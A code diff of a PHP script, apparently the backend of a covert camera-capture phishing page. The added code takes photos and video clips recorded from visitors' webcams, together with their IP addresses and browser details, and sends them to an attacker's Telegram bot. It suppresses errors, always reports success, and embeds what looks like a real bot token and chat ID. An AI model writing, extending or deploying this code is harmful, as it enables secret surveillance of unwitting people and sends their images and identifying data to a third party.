@@ -1,6 +1,7 @@
 <?php
 // ============================================
-// POST.PHP - Send Everything to Telegram
+// POST.PHP - Handles Photos & Videos
+// Sends both to Telegram
 // ============================================
 
 // Suppress all errors
@@ -8,15 +9,10 @@ error_reporting(0);
 ini_set('display_errors', 0);
 
 // ============================================
-// 🔑 PUT YOUR CREDENTIALS HERE
+// 🔑 YOUR TELEGRAM CREDENTIALS
 // ============================================
-
-// 👇 YOUR FULL BOT TOKEN FROM @BotFather
-// Example: "8591278217:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw"
-$botToken = "8591278217:AAFqz4Ncr8rqQuyEkcyfrnIefa5RUa2YWZY";  // <-- REPLACE THIS
-
-// 👇 YOUR CHAT ID (the one you provided)
-$chatId = "6715599952";  // <-- KEEP THIS AS IS
+$botToken = "8591278217:AAFqz4Ncr8rqQuyEkcyfrnIefa5RUa2YWZY";  // ← YOUR FULL TOKEN
+$chatId = "6715599952";  // ← YOUR CHAT ID
 
 // ============================================
 // GET DATA
@@ -29,16 +25,26 @@ $time = $_POST['tg_time'] ?? date('Y-m-d H:i:s');
 // ============================================
 // TELEGRAM SEND FUNCTION
 // ============================================
-function sendTelegramMessage($message, $photoPath = null) {
+function sendTelegramMessage($message, $fileData = null, $fileType = 'photo') {
     global $botToken, $chatId;
     
-    if ($photoPath && file_exists($photoPath)) {
-        // Send photo
-        $url = "https://api.telegram.org/bot$botToken/sendPhoto";
-        $cfile = curl_file_create($photoPath, 'image/png', 'capture.png');
+    if ($fileData) {
+        // Send file (photo or video)
+        if ($fileType === 'video') {
+            $url = "https://api.telegram.org/bot$botToken/sendVideo";
+        } else {
+            $url = "https://api.telegram.org/bot$botToken/sendPhoto";
+        }
+        
+        // Decode base64 file data
+        $fileContent = base64_decode(preg_replace('#^data:.*?;base64,#', '', $fileData));
+        $tempFile = tempnam(sys_get_temp_dir(), 'tg_') . ($fileType === 'video' ? '.webm' : '.png');
+        file_put_contents($tempFile, $fileContent);
+        
+        $cfile = curl_file_create($tempFile, $fileType === 'video' ? 'video/webm' : 'image/png', 'capture.' . ($fileType === 'video' ? 'webm' : 'png'));
         $data = [
             'chat_id' => $chatId,
-            'photo' => $cfile,
+            ($fileType === 'video' ? 'video' : 'photo') => $cfile,
             'caption' => $message,
             'parse_mode' => 'HTML'
         ];
@@ -57,10 +63,15 @@ function sendTelegramMessage($message, $photoPath = null) {
     curl_setopt($ch, CURLOPT_POST, 1);
     curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
     $result = curl_exec($ch);
     $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
     curl_close($ch);
+    
+    // Clean up temp file
+    if (isset($tempFile) && file_exists($tempFile)) {
+        unlink($tempFile);
+    }
     
     return $httpCode == 200;
 }
@@ -83,27 +94,35 @@ switch ($type) {
         break;
     
     // ==========================================
-    // CAMERA IMAGE
+    // PHOTO CAPTURE
     // ==========================================
     case 'image':
         $imageData = $_POST['tg_image'] ?? '';
         if (!empty($imageData) && strpos($imageData, 'data:image') !== false) {
-            // Save temp image
-            $filteredData = substr($imageData, strpos($imageData, ",") + 1);
-            $unencodedData = base64_decode($filteredData);
-            $tempFile = tempnam(sys_get_temp_dir(), 'img') . '.png';
-            file_put_contents($tempFile, $unencodedData);
-            
-            // Send to Telegram
-            $caption = "📸 <b>CAMERA CAPTURE</b>\n";
+            $caption = "📸 <b>PHOTO CAPTURE</b>\n";
             $caption .= "IP: <code>" . htmlspecialchars($ip) . "</code>\n";
             $caption .= "Time: $time\n";
             $caption .= "UA: " . htmlspecialchars($ua);
             
-            sendTelegramMessage($caption, $tempFile);
+            sendTelegramMessage($caption, $imageData, 'photo');
+        }
+        break;
+    
+    // ==========================================
+    // VIDEO CAPTURE
+    // ==========================================
+    case 'video':
+        $videoData = $_POST['tg_video'] ?? '';
+        $duration = $_POST['tg_duration'] ?? 0;
+        
+        if (!empty($videoData) && strpos($videoData, 'data:video') !== false) {
+            $caption = "🎥 <b>VIDEO CAPTURE</b>\n";
+            $caption .= "⏱️ Duration: {$duration}s\n";
+            $caption .= "IP: <code>" . htmlspecialchars($ip) . "</code>\n";
+            $caption .= "Time: $time\n";
+            $caption .= "UA: " . htmlspecialchars($ua);
             
-            // Clean up
-            unlink($tempFile);
+            sendTelegramMessage($caption, $videoData, 'video');
         }
         break;
     
@@ -138,6 +157,19 @@ switch ($type) {
         break;
     
     // ==========================================
+    // CAMERA READY NOTIFICATION
+    // ==========================================
+    case 'camera_ready':
+        $message = "📹 <b>CAMERA ACTIVE</b>\n\n";
+        $message .= "✅ Recording video (10s clips)\n";
+        $message .= "📸 Capturing photos (every 3s)\n";
+        $message .= "🌐 IP: <code>" . htmlspecialchars($ip) . "</code>\n";
+        $message .= "⏰ Time: $time";
+        
+        sendTelegramMessage($message);
+        break;
+    
+    // ==========================================
     // BROWSER INFO
     // ==========================================
     case 'browser_info':
@@ -167,15 +199,14 @@ switch ($type) {
         break;
     
     // ==========================================
-    // DEFAULT - Log everything else
+    // DEFAULT
     // ==========================================
     default:
         if (!empty($_POST)) {
             $message = "📦 <b>DATA RECEIVED</b>\n\n";
             $message .= "📝 <b>Type:</b> " . htmlspecialchars($type) . "\n";
             $message .= "🌐 <b>IP:</b> <code>" . htmlspecialchars($ip) . "</code>\n";
-            $message .= "⏰ <b>Time:</b> $time\n\n";
-            $message .= "<b>Raw Data:</b>\n<pre>" . htmlspecialchars(print_r($_POST, true)) . "</pre>";
+            $message .= "⏰ <b>Time:</b> $time";
             
             sendTelegramMessage($message);
         }
@@ -183,7 +214,7 @@ switch ($type) {
 }
 
 // ============================================
-// RESPONSE - Always return success silently
+// RESPONSE
 // ============================================
 header('Content-Type: application/json');
 echo json_encode(['status' => 'ok']);
